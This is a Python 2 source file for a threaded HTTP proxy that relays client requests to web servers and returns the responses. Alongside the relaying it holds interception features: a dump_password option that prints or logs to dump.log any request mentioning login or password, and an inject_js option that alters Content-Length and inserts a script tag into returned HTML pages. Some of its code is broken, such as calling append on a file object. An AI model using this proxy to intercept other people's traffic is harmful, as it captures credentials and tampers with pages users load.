#!/bin/env python
#-*- coding:utf-8 -*-
from time import time
from socket import error as sock_err, socket
from sys import stdout


def cltthread(sock, addr, queue, logqueue):
    """ This func is what manages each client connecting, for ONE requests


    @type sock: socket
    @param sock: Communication socket between proxy and client
    @type addr: tuple (ipv4, port)
    @param addr: Address representation of the client
    @type queue: queue
    @param queue: queue that will contain HTTP request to treat
    @type logqueue: queue
    @param logqueue: queue that will contain all logs when HTTP request are being treated
    """
    # we receive what the client wanna do
    content = ""
    while True:
        buffer_string = sock.recv(536)
        content += buffer_string
        if len(buffer_string) < 536:
            break
    msg = content
    if not len(msg):
        return ''
    #print '%s - [INFO] RECEIVED ALL CONTENT FROM %s'%(time(), addr)
    # we parse it
    try:
        dst = msg.split('Host: ')[1].split('\r\n')[0]
        port = int(dst.split(':')[1]) if ':' in dst else 80
        dst = dst.split(':')[0] if ':' in dst else dst
    except IndexError:
        # format of msg does not match usual stuff
        # Somebody else is probably attempting to get through our proxy
        # We need to do something here
        #logqueue.put([addr, repr(msg).replace('\r\n', '\\r\\n')])
        return 1
    # msg = ' '.join(msg.split('\r\n')[0].split(' ')[1:])
    # then we put it in the queue so that the workers will do their job
    queue.put([sock, dst, port, msg, addr])
    # finally LOG the file
    #print '%s - [INFO] %s - %s'%(time(), addr, repr(msg))
    #logqueue.put([addr, msg])
    # then returns
    return 0



def loger(queue):
    """
    This func handles any log a client may produce

    @type queue: queue
    @param queue: queue that will contain all the log from HTTP request
    """
    with open('http.log', 'r+') as file_descriptor:
        content = file_descriptor.read()
    while True:
        event = queue.get()
        content += '%s - [INFO] %s - %s\n'%(\
                                            time(),\
                                            event[0],\
                                            repr(event[1]).replace('\r\n', '\\r\\n')\
                                            )
        print '%s - [INFO] %s - %s'%(time(),event[0], repr(event[1]).replace('\r\n', '\\r\\n'))
        with open('http.log', 'w+') as file_descriptor:
            file_descriptor.write(content+'\n')


def worker(queue, logqueue, num, inject_js = False, dump_password = False):
    """
    This function is the threaded one that will be treating all HTTP request in live.
    It is meant to use inside a pool of thread. It will pickup any requests in its queue,
    will forward the request to the destinated webserver,
    and then forward back the returned packets to the client.

    @type queue: queue
    @param queue: queue that will contain all HTTP requests
    @type num: int
    @param num: the number of the thread.
    """
    while True:
        # If the queue is not empty (means that client wants something)
        # We should delete this line, i think it is killing the process
        # if not queue.empty():
        # We take the last oldest instruction from the queue
        # format of each element:
        # [client socket, remote host, remote port, client request]
        sock_client, dst, port, msg, addr = queue.get()
        begin_time = time()
        fdclient = sock_client.makefile()
        if 'login' in msg or 'password' in msg:
            if dump_password == 1:
                print msg
            elif dump_password == 2:
                with open('./dump.log', 'a+') as fd:
                    fd.append(msg)
            elif dump_password == 3:
                with open('./dump.log', 'a+') as fd:
                    print msg
                    fd.append(msg)
        try:
            sock = socket()
            # Connect to remote host
            sock.connect((dst, port))
            fdserver = sock.makefile('rwb', 0)
            # Send the HTTP Request
            fdserver.write(msg)
        except sock_err:
            if not fdserver.closed:
                fdserver.close()
                sock.close()
            if not fdclient.closed:
                fdclient.close()
                sock_client.close()
            continue
        # Setup every thing for server communication
        headers, header, headers_are_gone = '', False, False
        content, length, chunked = '', 0, False
        # Now we will work out with the server
        # We loop on the recv to get everything
        while True:
            if not header and not content:
                # if we have no header (the "not content" part is not mandatory
                # yet we did not want to risk a lockout).
                serverbuffer = fdserver.readline()
                headers += serverbuffer
                if serverbuffer == '\r\n':
                    header = True
                if 'Content-Length' in headers and not length:
                    length = int(headers.split('Content-Length: ')[1].split('\r\n')[0])
                    if inject_js:
                        headers = headers.replace('%d'%(length), '%d'%(length+len("<script>alert('vuln')</script>")))
                if 'Transfer-Encoding' in headers and 'chunked' in headers.split('Transfer-Encoding')[1].split('\r\n')[0] and not chunked:
                    chunked = True
            else:
                if not headers_are_gone:
                    fdclient.write(headers)
                    headers_are_gone = True
                ##############################################################################
                if length and not chunked:
                    # We should build some kind of coefficient, to see in how many
                    # times it is faster to download (ie you shouldn't download small
                    # files in 256 parts, nor you should download big files in 3 parts)
                    if length < (0.5 * 1024):
                        # file is really small
                        bufflength = length
                        # we download it in one time
                    elif length < (5 * 1024):
                        # file size < 5 ko
                        bufflength = 1024
                        # We download at 1 ko at a time
                    elif length < (100 * 1024):
                        # medium sized file
                        bufflength = 16 * 1024
                        # We download 16 ko each time
                    else:
                        # Really big file (over 100k characters)
                        bufflength = 32 * 1024
                        # We download 32 ko each time
                    while len(content) < length:
                        minibuff = fdserver.read(bufflength if length - len(content) > bufflength else length - len(content))
                        content += minibuff
                    # We should be done downloading the page. Gotta send it back
                    try:
                        if inject_js:
                            content = content.replace("</HTML>", "<script>alert('vuln')</script></HTML>").replace("</html>", "<script>alert('vuln')</script></html>")

                            fdclient.write(content)
                        else:
                            fdclient.write(content)
                    except sock_err:
                        pass
                    # Cleanup
                    if not fdclient.closed:
                        fdclient.close()
                        sock_client.close()
                    if not fdserver.closed:
                        fdserver.close()
                        sock.close()
                    break
                ##############################################################################
                elif chunked:
                    if length:
                        # Chunked = True and length = True
                        # I dont think it is possible
                        try:
                            fdclient.write('Not implemented')
                        except sock_err:
                            pass
                    else:
                        # Chunked = True and length = False
                        # Probably will be the most used case
                        while True:
                            rawchunksize = fdserver.readline()
                            if rawchunksize == '\r\n':
                                content += rawchunksize
                            elif rawchunksize == '0\r\n' and fdserver.readline() == '\r\n':
                                content += rawchunksize
                                try:
                                    if inject_js:
                                        content = content.replace("</HTML>", "<script>alert('vuln')></script></HTML>").replace("</html>", "<script>alert('vuln')</script></html>")
                                        fdclient.write(content)
                                    else:
                                        fdclient.write(content)
                                except sock_err:
                                    break
                                if not fdclient.closed:
                                    fdclient.close()
                                    sock_client.close()
                                if not fdserver.closed:
                                    fdserver.close()
                                    sock.close()
                                break
                            else:
                                content += rawchunksize
                                chunksize = int(rawchunksize.split('\r\n')[0], 16)
                                content += fdserver.read(chunksize)
                        break
                ##############################################################################
                else:
                    # This is kinda try hard mode
                    sock.settimeout(1)
                    while True:
                        # if we dont have any length, we read 1 byte at a time
                        # this could make it laggy, but we really are at the end of the
                        # file when there is a timeout, which is set to 1s (it's small,
                        # but people want http to go fast :-) )
                        try:
                            serverbuffer = fdserver.read(1)
                            content += serverbuffer
                        except sock_err:
                            # The timeout has been reached, which means that:
                            # 1/ The page content has ended (OK)
                            # 2/ The request was head or page content length is 0 (OK)
                            # 3/ The connection died... (KO)
                            # We have no way of detecting which one it is for now.
                            if not fdserver.closed:
                                # No matter which case of the above ones,
                                # we need to close the socket/file descriptor.
                                fdserver.close()
                                sock.close()
                            if not fdclient.closed:
                                # We should send some error code and then close the socket and the fd
                                # unless it's a HEAD request
                                if not 'HEAD' in msg:
                                    try:
                                        fdclient.write('Try hard mode failed. Contact your administrator')
                                    except sock_err:
                                        pass
                                else:
                                    if not headers_are_gone:
                                        try:
                                            fdclient.write(headers)
                                        except sock_err:
                                            pass
                                try:
                                    fdclient.close()
                                    sock_client.close()
                                except sock_err:
                                    break
                        break
                    break
                ##############################################################################


# vim: tabstop=8 expandtab shiftwidth=4 softtabstop=4
